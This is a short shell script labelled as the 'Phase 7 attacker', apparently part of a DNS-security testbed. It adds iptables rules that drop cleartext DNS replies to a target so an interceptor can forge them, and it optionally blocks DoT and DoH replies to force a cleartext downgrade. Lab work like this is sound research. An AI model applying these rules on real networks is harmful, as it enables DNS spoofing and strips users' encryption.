#!/bin/sh
# Phase 7 attacker. Kernel-forwards the encrypted transport (TCP 853 DoT) but drops
# kernel-forwarded cleartext UDP-53 replies so the libpcap interceptor is their sole
# relay (and can forge them, exactly as on the Phase 6 last mile).
iptables -A FORWARD -p udp --sport 53 -d 172.16.1.10 -j DROP 2>/dev/null || true
# attack (iii): deny the encrypted transport, forcing a cleartext fallback
if [ "${BLOCK853:-0}" = "1" ]; then
    iptables -A FORWARD -p tcp --sport 853 -j DROP
    iptables -A FORWARD -p tcp --sport 443 -j DROP
    echo "attacker: BLOCK853=1 -- dropping DoT/DoH replies (forcing cleartext fallback)"
fi
exec interceptor
